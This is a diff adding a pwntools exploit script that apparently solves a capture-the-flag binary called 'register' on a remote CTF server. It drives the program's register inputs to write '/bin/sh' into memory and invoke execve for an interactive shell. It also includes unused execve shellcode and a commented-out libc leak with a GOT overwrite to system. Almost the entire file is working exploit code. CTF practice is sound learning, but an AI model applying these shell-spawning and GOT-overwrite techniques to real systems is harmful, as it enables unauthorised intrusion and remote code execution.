@@ -1,0 +1,131 @@
+from pwn import *
+from Crypto.Util.number import bytes_to_long
+
+
+r = remote("ctf.j0n9hyun.xyz", 3026)
+# r = process("./register")
+
+
+# lib = ELF("./libc.so.6")
+e = ELF("./register")
+'''
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+'''
+
+shellcode32 = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+
+
+bss = 0x601078 # 6295672
+
+
+# rdi, rsi, rdx
+
+# bss에 binsh 입력
+# 입력순서 rax, rdi, si, rdx, rcx, r8, r9
+
+r.sendline("0") 
+sleep(0.1)
+r.sendline("0")
+sleep(0.1)
+r.sendline(str(bss))
+sleep(0.1)
+r.sendline("8")
+sleep(0.1)
+r.sendline("0")
+sleep(0.1)
+r.sendline("0")
+sleep(0.1)
+r.sendline("0")
+
+print(r.recvuntil("R9: "))
+
+
+sleep(0.1)
+r.send("/bin/sh\x00")
+sleep(0.1)
+
+
+
+# execve(binsh, 0, 0) 59
+
+r.sendline("59") 
+sleep(0.1)
+r.sendline(str(bss))
+sleep(0.1)
+r.sendline("0")
+sleep(0.1)
+r.sendline("0")
+sleep(0.1)
+r.sendline("0")
+sleep(0.1)
+r.sendline("0")
+sleep(0.1)
+r.sendline("0")
+sleep(4)
+
+
+'''
+# write(1, got, 8)
+# libc leak
+# 0x601028 = 6295592
+r.sendline("1")
+sleep(0.1)
+r.sendline("1")
+sleep(0.1)
+r.sendline(str(e.got['printf']))
+sleep(0.1)
+r.sendline("8")
+sleep(0.1)
+r.sendline("0")
+sleep(0.1)
+r.sendline("0")
+sleep(0.1)
+print(r.recvuntil("R9: "))
+
+r.sendline("0")
+
+sleep(0.1)
+
+
+
+res = r.recv(8)
+print(res)
+libc_base = u64(res.ljust(8, b"\x00"))
+print(hex(libc_base))
+
+libc_system = libc_base + 0x035930 - 0x043800
+
+# atol_got overwrite
+print(hex(libc_system))
+
+r.sendline("0") 
+sleep(0.1)
+r.sendline("0")
+sleep(0.1)
+r.sendline(str(e.got['atol']))
+sleep(0.1)
+r.sendline("8")
+sleep(0.1)
+r.sendline("0")
+sleep(0.1)
+r.sendline("0")
+sleep(0.1)
+print(r.recvuntil("R9: "))
+
+r.sendline("0")
+
+
+
+sleep(0.1)
+r.sendline(p64(libc_system))
+sleep(0.1)
+
+
+
+# r.sendline(p64(bss))
+'''
+r.interactive()
